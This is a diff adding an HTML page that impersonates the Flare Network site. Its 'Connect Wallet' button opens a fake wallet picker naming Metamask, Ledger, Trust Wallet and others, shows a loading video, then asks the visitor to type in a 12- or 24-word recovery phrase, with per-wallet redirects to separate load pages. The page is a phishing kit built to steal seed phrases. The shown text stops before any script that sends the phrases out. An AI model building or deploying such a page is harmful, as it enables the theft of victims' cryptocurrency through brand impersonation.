@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flare Network - The blockchain for data</title>
+    <link rel="icon" href="FLR-iA8A7EPo.svg" type="image/x-icon">
+    <link href="styles.css" rel="stylesheet">
+    <style>
+        * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+  background-color: #ffffff;
+  color: #1f2937;
+  line-height: 1.6;
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 24px;
+}
+
+/* Header */
+.header {
+  padding: 16px 0;
+  position: relative;
+  z-index: 100;
+}
+
+.header .container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.logo-text {
+  font-size: 24px;
+  font-weight: bold;
+  background: linear-gradient(135deg, #ec4899, #db2777);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.nav {
+  display: flex;
+  gap: 32px;
+}
+
+.nav-link {
+  color: #374151;
+  text-decoration: none;
+  transition: color 0.3s ease;
+}
+
+.nav-link:hover {
+  color: #db2777;
+}
+
+.mobile-menu-btn {
+  display: none;
+  flex-direction: column;
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 8px;
+}
+
+.mobile-menu-btn span {
+  width: 24px;
+  height: 2px;
+  background-color: #374151;
+  margin: 3px 0;
+  transition: 0.3s;
+  text-decoration-color: pink;
+}
+
+/* Hero Section */
+.hero {
+  position: relative;
+  min-height: 70vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  padding: 80px 24px;
+}
+
+.hero-bg {
+  position: absolute;
+  inset: 0;
+  overflow: hidden;
+}
+
+.shape {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(60px);
+  opacity: 0.2;
+  animation: float 6s ease-in-out infinite;
+}
+
+.shape-1 {
+  top: -80px;
+  left: -80px;
+  width: 384px;
+  height: 384px;
+  background: linear-gradient(135deg, #f472b6, #ec4899, #9333ea);
+  transform: rotate(12deg);
+  animation-delay: 0s;
+}
+
+.shape-2 {
+  top: 25%;
+  right: -128px;
+  width: 320px;
+  height: 320px;
+  background: linear-gradient(225deg, #fbb6ce, #f472b6, #a855f7);
+  opacity: 0.25;
+  animation-delay: 2s;
+}
+
+.shape-3 {
+  bottom: 0;
+  left: 25%;
+  width: 256px;
+  height: 256px;
+  background: linear-gradient(45deg, #ec4899, #db2777, #7c3aed);
+  opacity: 0.15;
+  animation-delay: 4s;
+}
+
+.shape-4 {
+  bottom: 80px;
+  right: 40px;
+  width: 288px;
+  height: 288px;
+  background: linear-gradient(315deg, #f472b6, #ec4899, #9333ea);
+  transform: rotate(-12deg);
+  animation-delay: 1s;
+}
+
+@keyframes float {
+  0%,
+  100% {
+    transform: translateY(0px) rotate(0deg);
+  }
+  50% {
+    transform: translateY(-20px) rotate(5deg);
+  }
+}
+
+.hero-content {
+  position: relative;
+  z-index: 10;
+  text-align: center;
+  max-width: 800px;
+}
+
+.hero-icon {
+  margin-bottom: 32px;
+}
+
+.icon-shape {
+  width: 48px;
+  height: 48px;
+  margin: 0 auto;
+  background: linear-gradient(135deg, #ec4899, #db2777);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+
+.icon-shape::after {
+  content: "";
+  width: 24px;
+  height: 24px;
+  background-color: white;
+  border-radius: 2px;
+  transform: rotate(45deg);
+}
+
+.hero-title {
+  font-size: clamp(2.5rem, 5vw, 4rem);
+  font-weight: bold;
+  margin-bottom: 24px;
+  line-height: 1.2;
+}
+
+.hero-subtitle {
+  font-size: 20px;
+  color: #6b7280;
+  margin-bottom: 32px;
+  max-width: 600px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.cta-button {
+  background: linear-gradient(135deg, #db2777, #be185d);
+  color: white;
+  border: none;
+  padding: 12px 32px;
+  font-size: 18px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  font-weight: 500;
+}
+
+.cta-button:hover {
+  background: linear-gradient(135deg, #be185d, #9d174d);
+  transform: translateY(-2px);
+  box-shadow: 0 10px 25px rgba(219, 39, 119, 0.3);
+}
+
+/* Partners Section */
+.partners {
+  padding: 64px 0;
+}
+
+.partners-label {
+  text-align: center;
+  font-size: 12px;
+  color: #9ca3af;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 48px;
+}
+
+.partners-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 32px;
+  align-items: center;
+  justify-items: center;
+}
+
+.partner {
+  font-weight: bold;
+  color: #374151;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.partner.layerzero {
+  font-size: 18px;
+}
+
+.partner.hypernative {
+  color: #059669;
+}
+
+.partner.google-cloud {
+  color: #374151;
+  font-weight: 500;
+}
+
+.partner.ankr {
+  color: #2563eb;
+  font-size: 20px;
+}
+
+.partner.arkham {
+  font-size: 16px;
+}
+
+.partner.hextrust {
+  color: #1e40af;
+  font-weight: 600;
+}
+
+.partner-icon {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background-color: #374151;
+}
+
+.google-icon {
+  background: linear-gradient(135deg, #4285f4, #34a853);
+}
+
+/* Mobile Styles */
+@media (max-width: 768px) {
+  .nav {
+    display: none;
+    position: absolute;
+    top: 100%;
+    left: 0;
+    right: 0;
+    background: white;
+    flex-direction: column;
+    padding: 20px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  }
+
+  .nav.active {
+    display: flex;
+  }
+
+  .mobile-menu-btn {
+    display: flex;
+  }
+
+  .mobile-menu-btn.active span:nth-child(1) {
+    transform: rotate(-45deg) translate(-5px, 6px);
+  }
+
+  .mobile-menu-btn.active span:nth-child(2) {
+    opacity: 0;
+  }
+
+  .mobile-menu-btn.active span:nth-child(3) {
+    transform: rotate(45deg) translate(-5px, -6px);
+  }
+
+  .hero {
+    min-height: 60vh;
+    padding: 60px 24px;
+  }
+
+  .hero-title {
+    font-size: 2.5rem;
+  }
+
+  .hero-subtitle {
+    font-size: 18px;
+  }
+
+  .partners-grid {
+    grid-template-columns: repeat(2, 1fr);
+    gap: 24px;
+  }
+
+  .partner {
+    font-size: 14px;
+  }
+}
+
+@media (max-width: 480px) {
+  .container {
+    padding: 0 16px;
+  }
+
+  .hero {
+    padding: 40px 16px;
+  }
+
+  .partners-grid {
+    grid-template-columns: 1fr;
+  }
+}
+
+
+.flare-tech-section {
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 40px;
+  padding: 40px 0;
+}
+
+.flare-column {
+  flex: 1;
+  min-width: 260px;
+}
+
+.flare-column h4 {
+  font-size: 12px;
+  letter-spacing: 1px;
+  color: #888;
+  margin-bottom: 16px;
+  text-transform: uppercase;
+}
+
+.flare-column h3 {
+  font-size: 18px;
+  margin: 8px 0 4px;
+}
+
+.flare-column p {
+  font-size: 14px;
+  color: #555;
+  margin-bottom: 16px;
+  line-height: 1.5;
+}
+
+.flare-center .xrp {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-width: 300px;
+}
+
+.video-placeholder {
+  width: 100%;
+  max-width: 400px;
+  height: 300px;
+  background: #f2f2f2;
+  border: 2px dashed #ccc;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #999;
+  font-size: 16px;
+  text-align: center;
+}
+
+.flare-video {
+  width: 100%;
+  max-width: 400px;
+  aspect-ratio: 4 / 3;
+  background: transparent;
+  border-radius: 0;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.flare-video video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+  border: none;
+  outline: none;
+  background: transparent;
+  pointer-events: none; /* Prevent hover or click interaction */
+}
+
+.fast-stats-section {
+  position: relative;
+  height: 400px;
+  background-color: #fff; /* Default background color */
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background-color 0.4s ease; /* Transition for background */
+}
+
+/* Removed hover styles for background */
+.fast-stats-section.in-view {
+  background-color: #e61659; /* Color change when in view */
+}
+
+.background-video-container {
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 100%;
+  width: 100%;
+  z-index: 0;
+  pointer-events: none;
+  overflow: hidden;
+  opacity: 0.15;
+  transition: opacity 0.4s ease;
+  justify-content: left;
+}
+
+.fast-stats-section.in-view .background-video-container {
+  opacity: 0.2; /* Slightly increased opacity when in view */
+}
+
+.background-video-container video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.fast-content {
+  position: relative;
+  z-index: 2;
+  text-align: center;
+  padding: 20px;
+  color: black; /* Default text color */
+  transition: color 0.3s ease; /* Transition for text color */
+}
+
+/* Removed hover styles for text color */
+.fast-stats-section.in-view .fast-content {
+  color: white; /* Text color change when in view */
+}
+
+.fast-text h1 {
+  font-size: 70px;
+  margin-bottom: 10px;
+}
+
+.fast-text .counter {
+  font-size: 36px;
+  font-weight: bold;
+  transition: all 0.4s ease;
+}
+
+.fast-text p {
+  font-size: 14px;
+  margin-top: 10px;
+}
+
+.hero {
+  position: relative;
+  overflow: hidden;
+  height: 100vh;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 40px;
+}
+
+/* Background Video Styling */
+.hero-video-bg {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.hero-video-bg video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+/* Background Shapes */
+.hero-bg {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 1;
+}
+
+.shape {
+  position: absolute;
+  width: 150px;
+  height: 150px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.08);
+  filter: blur(40px);
+}
+
+.shape-1 { top: 10%; left: 15%; }
+.shape-2 { top: 30%; right: 10%; }
+.shape-3 { bottom: 20%; left: 20%; }
+.shape-4 { bottom: 10%; right: 15%; }
+
+/* Hero Content */
+.hero-content {
+  position: relative;
+  z-index: 2;
+  max-width: 800px;
+  margin: auto;
+}
+
+.hero-icon img {
+  height: 60px;
+  margin-bottom: 20px;
+}
+
+.hero-title {
+  font-size: 3rem;
+  margin-bottom: 20px;
+}
+
+.hero-subtitle {
+  font-size: 1.25rem;
+  margin-bottom: 30px;
+}
+
+.cta-button {
+  padding: 12px 24px;
+  background-color: #e61659;
+  border: none;
+  border-radius: 25px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.cta-button:hover {
+  background-color: #c71548;
+}
+
+.fast {
+  text-align: right;
+  justify-content: center;
+}
+
+
+.participate {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  padding: 40px 20px;
+  background-color: #fff;
+}
+
+.title {
+  text-align: center;
+  font-size: 40px;
+  font-weight: 500;
+  margin-bottom: 20px;
+}
+
+.banner img {
+  width: 100%;
+  max-height: 330px;
+  object-fit: cover;
+  border-radius: 10px;
+}
+
+.navbar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 10px;
+  border-top: 1px solid #ddd;
+  border-bottom: 1px solid #ddd;
+  margin-top: 20px;
+}
+
+.logo {
+  height: 24px;
+}
+
+.nav-links {
+  list-style: none;
+  display: flex;
+  gap: 20px;
+  font-size: 14px;
+  padding: 0;
+  margin: 0;
+}
+
+.nav-links a {
+  text-decoration: none;
+  color: #333;
+}
+
+.nav-links a:hover {
+  text-decoration: none;
+  color: #333;
+}
+
+
+.cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 20px;
+  margin-top: 40px;
+}
+
+.card {
+  background-color: #ffeef5;
+  padding: 20px;
+  border-radius: 12px;
+  text-align: center;
+  transition: box-shadow 0.3s ease;
+  cursor: pointer; /* Added cursor for clickable elements */
+}
+
+.card img {
+  height: 100px;
+  margin-bottom: 15px;
+}
+
+.card h3 {
+  color: #e6007a;
+  font-size: 16px;
+  margin-bottom: 10px;
+}
+
+.card p {
+  font-size: 14px;
+  color: #444;
+}
+
+.card:hover {
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+}
+
+
+/* Newsletter section */
+.newsletter-section {
+  background-color: #f8f8f8;
+  padding: 40px 20px;
+  text-align: center;
+}
+
+.newsletter-content h2 {
+  font-size: 24px;
+  margin-bottom: 10px;
+}
+
+.newsletter-content p {
+  max-width: 600px;
+  margin: 0 auto 20px;
+  font-size: 16px;
+  color: #444;
+}
+
+.subscribe-button {
+  background-color: #d10a44;
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  font-size: 15px;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+.subscribe-button:hover {
+  background-color: #b5093b;
+}
+
+/* Footer */
+.footer {
+  background-color: #fff;
+  border-top: 1px solid #ddd;
+  padding: 30px 20px;
+  font-size: 14px;
+  color: #333;
+}
+
+.footer-top {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+
+.footer-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.footer-logo {
+  height: 20px;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 15px;
+  margin-bottom: 20px;
+}
+
+.footer-links a {
+  text-decoration: none;
+  color: #333;
+}
+
+.footer-links a:hover {
+  text-decoration: underline;
+}
+
+.social-icons {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.social-icons img {
+  height: 20px;
+  cursor: pointer;
+}
+
+/* Dev links */
+.footer-bottom {
+  border-top: 1px solid #eee;
+  padding-top: 20px;
+  margin-top: 20px;
+  text-align: center;
+}
+
+.footer-bottom h4 {
+  font-weight: bold;
+  margin-bottom: 10px;
+  color: #444;
+}
+
+.dev-links {
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+
+.dev-links a {
+  text-decoration: none;
+  color: #0066cc;
+}
+
+.dev-links a:hover {
+  text-decoration: underline;
+}
+
+
+        /* MODAL STYLES */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000; /* Ensure it's above everything */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .modal-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            max-width: 28rem; /* Max width for the modal */
+            width: 90%; /* Responsive width */
+            transform: translateY(-50px);
+            opacity: 0;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+        }
+
+        .modal-overlay.visible .modal-content {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .modal-close-button {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
+            transition: color 0.2s ease;
+        }
+
+        .modal-close-button:hover {
+            color: #333;
+        }
+
+        /* WALLET CONNECT CLONE STYLES (copied and adapted from previous version) */
+        #walletMainContainer {
+            background-color: #ffffff;
+            box-shadow: none; /* No extra shadow, modal-content provides it */
+            border-radius: 1rem;
+            padding: 0; /* Padding handled by modal-content */
+            width: 100%;
+            max-width: 24rem;
+            margin: 0; /* Margin handled by flex centering in modal-overlay */
+        }
+
+        .wallet-header-section {
+            margin-bottom: 1.5rem;
+        }
+
+        .wallet-reown-tag {
+            display: inline;
+            background-color: #1a202c;
+            color: #ffffff;
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-main-title {
+            font-size: 1.25rem;
+            line-height: 1.75rem;
+            font-weight: 700;
+            color: #1f2937;
+            text-align: right;
+            padding: 0.25rem 0.75rem;
+        }
+        @media (min-width: 768px) {
+            .wallet-main-title {
+                font-size: 1.5rem;
+                line-height: 2rem;
+            }
+        }
+
+        .wallet-list-message {
+            color: #4b5563;
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-list-container {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            max-height: 16rem;
+            overflow-y: auto;
+            padding-right: 0.5rem;
+        }
+        .wallet-list-container > li {
+            margin-bottom: 0.75rem;
+        }
+        .wallet-list-container > li:last-child {
+            margin-bottom: 0;
+        }
+
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            background-color: #f9fafb;
+            padding: 0.75rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            transition: all 0.2s ease-in-out;
+            cursor: pointer;
+        }
+
+        .wallet-item:hover {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        .wallet-item img {
+            width: 2.5rem;
+            height: 2.5rem;
+            border-radius: 0.5rem;
+            margin-right: 1rem;
+        }
+
+        .wallet-item span {
+            color: #1f2937;
+            font-weight: 500;
+        }
+
+        .wallet-universal-connect-section {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .wallet-universal-connect-section svg {
+            width: 4rem;
+            height: 4rem;
+            margin-left: auto;
+            margin-right: auto;
+            color: #9ca3af;
+            margin-bottom: 0.75rem;
+        }
+
+        .wallet-universal-connect-section p {
+            color: #4b5563;
+        }
+
+        /* Custom scrollbar styles */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        /* NEW: Loading Overlay Styles */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black; /* Or any dark color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000; /* Higher than modal */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .loading-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-overlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensures video covers the area */
+        }
+
+        /* NEW: Phrase Input Modal Styles */
+        #phraseInputModal .modal-content {
+            max-width: 28rem; /* Keep consistent with wallet modal */
+            text-align: center;
+        }
+
+        #phraseInputModal .wallet-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1rem;
+            border-radius: 10px;
+        }
+
+        #phraseInputModal h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: #1f2937;
+        }
+
+        #phraseInputModal p {
+            color: #4b5563;
+            margin-bottom: 1.5rem;
+        }
+
+        #phraseInputModal textarea {
+            width: calc(100% - 2rem); /* Adjust for padding */
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #ccc;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            resize: vertical; /* Allow vertical resizing */
+            min-height: 100px;
+        }
+
+        #phraseInputModal button {
+            background-color: #007bff;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        #phraseInputModal button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-text"><img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo">flare</span>
+            </div>
+
+            <nav class="nav" id="nav">
+                <a href="#" class="nav-link">Participate</a>
+                <a href="#" class="nav-link">Products</a>
+                <a href="#" class="nav-link">Developers</a>
+                <a href="#" class="nav-link">Network</a>
+                <a href="#" class="nav-link">News & Events</a>
+            </nav>
+
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-video-bg">
+            <video autoplay muted loop playsinline>
+                <source src="media/home_hero_mobile.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <div class="hero-bg">
+            <div class="shape shape-1"></div>
+            <div class="shape shape-2"></div>
+            <div class="shape shape-3"></div>
+            <div class="shape shape-4"></div>
+        </div>
+
+        <div class="hero-content">
+            <div class="hero-icon">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="flare">
+                <div class="icon-shap"></div>
+            </div>
+
+            <h1 class="hero-title">The blockchain for data</h1>
+
+            <p class="hero-subtitle">
+                Flare is a full-stack layer 1 solution designed for data intensive use cases.
+            </p>
+
+            <button class="cta-button open-wallet-modal">Connect Wallet</button>
+        </section>
+
+    <div id="walletModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <button class="modal-close-button" id="closeWalletModalBtn">×</button>
+            <div id="walletMainContainer">
+                <div class="wallet-header-section">
+                    <h1 class="wallet-main-title">Manual Kit</h1>
+                    <span class="wallet-reown-tag">reown</span>
+                </div>
+
+                <div id="walletListSection">
+                    <p class="wallet-list-message">Recommended :</p>
+
+                    <ul class="wallet-list-container custom-scrollbar">
+                        <li class="wallet-item"
+                            data-wallet-name="Metamask"
+                            data-loading-video="media/metamask.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.qYA89uEFCYsvUmWJ1_2otgHaHa?rs=1&pid=ImgDetMain"
+                            data-redirect-page="metaload.html">
+                            <img src="https://th.bing.com/th/id/OIP.qYA89uEFCYsvUmWJ1_2otgHaHa?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Metamask Logo">
+                            <span>Metamask</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Trust Wallet"
+                            data-loading-video="media/trust.mp4"
+                            data-phrase-image="media/signal-2025-06-07-050439-removebg-preview.png"
+                            data-redirect-page="trustload.html">
+                            <img src="https://th.bing.com/th/id/OIP.JdIlpLhPz03zFounryCkVwHaHa?w=171&h=180&c=7&r=0&o=7&pid=1.7&rm=3" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Trust Wallet Logo">
+                            <span>Trust Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Coinbase Wallet"
+                            data-loading-video="media/coinbase.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.q60zb-LgXVF8J6-QwS2WEwHaHY?w=908&h=906&rs=1&pid=ImgDetMain"
+                            data-redirect-page="coinload.html">
+                            <img src="https://th.bing.com/th/id/OIP.q60zb-LgXVF8J6-QwS2WEwHaHY?w=908&h=906&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Coinbase Wallet Logo">
+                            <span>Coinbase Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Ledger"
+                            data-loading-video="media/ledger.mp4"
+                            data-phrase-image="https://styles.redditmedia.com/t5_7rc222/styles/communityIcon_2e19ie5q5sba1.png"
+                            data-redirect-page="ledgerload.html">
+                            <img src="https://styles.redditmedia.com/t5_7rc222/styles/communityIcon_2e19ie5q5sba1.png" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Ledger Logo">
+                            <span>Ledger</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Trezor Wallet"
+                            data-loading-video="media/trezor.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.zp7kUq_-fTgbpSaf392l0QHaHa?w=512&h=512&rs=1&pid=ImgDetMain"
+                            data-redirect-page="trezorload.html">
+                            <img src="https://th.bing.com/th/id/OIP.zp7kUq_-fTgbpSaf392l0QHaHa?w=512&h=512&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Trezor Wallet">
+                            <span>Trezor Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Phantom Wallet"
+                            data-loading-video="media/phantom.mp4"
+                            data-phrase-image="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM"
+                            data-redirect-page="phantomload.html">
+                            <img src="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Phantom wallet logo">
+                            <span>Phantom Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="OKX Wallet"
+                            data-loading-video="media/okx.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.PGNYkP1nNq6402I1zmkUiwAAAA?rs=1&pid=ImgDetMain"
+                            data-redirect-page="okxload.html">
+                            <img src="https://th.bing.com/th/id/OIP.PGNYkP1nNq6402I1zmkUiwAAAA?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="OKX Logo">
+                            <span>OKX Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Rabby Wallet"
+                            data-loading-video="media/rabby.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.BOlkQ_fzzzVU-_j37Byg5AAAAA?w=379&h=283&rs=1&pid=ImgDetMain"
+                            data-redirect-page="rabbyload.html">
+                            <img src="https://th.bing.com/th/id/OIP.BOlkQ_fzzzVU-_j37Byg5AAAAA?w=379&h=283&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="RabbyLogo">
+                            <span>Rabby Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Uniswap Wallet"
+                            data-loading-video="media/uniswap.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.eaQNSC4TxgcvfW2tsjIqzQHaHa?rs=1&pid=ImgDetMain"
+                            data-redirect-page="uniswapload.html">
+                            <img src="https://th.bing.com/th/id/OIP.eaQNSC4TxgcvfW2tsjIqzQHaHa?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Uniswap Logo">
+                            <span>Uniswap Wallet</span>
+                        </li>
+                    </ul>
+
+                    <div class="wallet-universal-connect-section">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                        </svg>
+                        <p>Connect your wallet to get started</p>
+                    </div>
+                </div>
+            </div>
+            </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <video id="loadingVideo" muted playsinline></video>
+    </div>
+
+    <div id="phraseInputModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <button class="modal-close-button" id="closePhraseModalBtn">×</button>
+            <img id="phraseWalletIcon" class="wallet-icon" src="" alt="Wallet Icon">
+            <h2 id="phraseModalTitle">Connect with Your Wallet</h2>
+            <p>Please input your 12 or 24 word recovery phrase to connect.</p>
+            <textarea id="recoveryPhrase" placeholder="Enter your recovery phrase here..."></textarea>
+            <button id="connectPhraseBtn">Connect Wallet</button>
+        </div>
+    </div>
+    <section class="partners">
+        <div class="container">
+            <p class="partners-label">Building with the best</p>
+
+            <div class="partners-grid">
+                <div class="partner"><img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FElliptic.png&w=384&q=75" height="55" alt="Elliptic"></div>
+                <div class="partner layerzero">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FLayerZero_Logo_Full%201.png&w=640&q=75" height="55" alt="LayerZero">
+                </div>
+                <div class="partner hypernative">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fhypernative.png&w=640&q=75" height="55" alt="Hypernative">
+                </div>
+                <div class="partner google-cloud">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FGoogle_Cloud.png&w=640&q=75" height="55" alt="Google Cloud">
+                </div>
+                <div class="partner ankr"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fankr-1.png&w=384&q=75" alt="Ankr"></div>
